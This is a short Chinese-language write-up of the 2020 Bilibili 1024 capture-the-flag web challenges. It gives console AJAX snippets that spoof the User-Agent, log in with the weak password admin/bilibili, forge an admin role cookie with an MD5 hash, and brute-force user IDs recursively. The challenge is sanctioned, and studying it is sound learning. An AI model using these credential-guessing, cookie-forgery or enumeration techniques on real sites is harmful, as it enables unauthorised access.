# 2020-bilibili-sec1024

>本记录由 TePuint Club 赞助完成

## 第一题

打开DevTool审查元素，在`<input>`中找到data

## 第二题

修改浏览器的User-Agent为 `bilibili Security Browser`，然后刷新网页。

或者在Console中输入：

```javascript
$.ajax({
    url: "api/ctf/2",
    type: "get",
    success: function (data) {
        console.log(data.data);
    }
})
```

## 第三题

就是弱口令，完全靠猜，用户名 `admin` ，密码 `bilibili` 。

或者在Console中输入：

```javascript
$.ajax({
    url: "api/ctf/3",
    type: "post",
    contentType: "application/json",
    dataType: "json",
    data: JSON.stringify({
        username: "admin",
        passwd: "bilibili",
    }),
    success: function (data) {
        console.log(data.data)
    }
})
```

## 第四题

cookies中role对应的值为user的MD5，所以将这个值改为 `Administration` 的MD5，即 `7b7bc2512ee1fedcd76bdc68926d4f7b` ，然后刷新网页即可。

或者在Console中输入：

```javascript
$.ajax({
    url: "api/ctf/4",
    type: "get",
    success: function (data) {
        console.log(data.data);
    }
})
```

## 第五题

使用Console向后穷举，我也不知道那个uid哪里来的。

在Console中输入：

```javascript
get(100336889) //这里每个人有可能不一样，请在网页中查找
function get(uid) {
    $.ajax({
        url: "api/ctf/5?uid=" + uid,
        type: "get",
        success: function (data) {
            if (data.code == 200) {
                console.log(data.data)
            } else {
                get(uid + 1)
            }
        }
    })
}
```